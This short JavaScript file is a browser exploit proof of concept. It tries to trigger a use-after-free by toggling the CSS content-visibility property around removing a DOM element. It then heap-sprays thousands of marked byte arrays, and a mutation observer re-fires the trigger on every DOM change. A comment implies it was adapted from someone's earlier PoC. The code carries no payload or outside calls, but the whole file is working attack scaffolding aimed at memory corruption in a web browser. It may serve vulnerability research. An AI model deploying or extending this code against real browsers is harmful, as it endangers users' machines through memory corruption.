import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
const child = document.querySelector(".child");

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    arr[0] = 0x41; // Mark for identification
    spray.push(arr);
  }
  debug_log("Heap spray completed");
  return spray;
}

export function triggerUAF() {
  debug_log("Setting content-visibility: hidden");
  container.style.contentVisibility = "hidden";

  debug_log("Removing child");
  child.remove();

  setTimeout(() => {
    debug_log("Restoring content-visibility: auto");
    container.style.contentVisibility = "auto";
    let spray = heapSpray();
    debug_log("UAF logic complete — check for crash or memory corruption.");
  }, 0);
}

// If you want to observe DOM mutations as in your original PoC:
const observer = new MutationObserver(() => {
  debug_log("DOM tree modified, retriggering UAF...");
  triggerUAF();
});
observer.observe(container, { childList: true, subtree: true });
